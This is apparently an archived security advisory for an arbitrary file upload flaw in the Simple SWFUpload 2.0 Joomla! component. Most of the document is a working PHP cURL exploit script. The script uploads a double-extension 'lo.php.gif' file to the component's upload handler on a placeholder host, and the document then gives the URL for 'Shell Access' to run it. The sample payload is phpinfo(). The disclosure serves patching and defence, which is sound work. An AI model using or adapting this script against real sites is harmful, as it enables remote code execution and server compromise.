source: http://www.securityfocus.com/bid/53968/info

The Simple SWFUpload component for Joomla! is prone to a vulnerability that lets attackers upload arbitrary files because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

Simple SWFUpload 2.0 is vulnerable;other versions may also be affected. 

<?php

$uploadfile="lo.php.gif";

$ch = 
curl_init("http://www.exemple.com/administrator/components/com_simpleswfupload/uploadhandler.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
                array('Filedata'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>

Shell Access : http://www.exemple.com/images/stories/lo.php.gif

lo.php.gif
<?php
phpinfo();
?>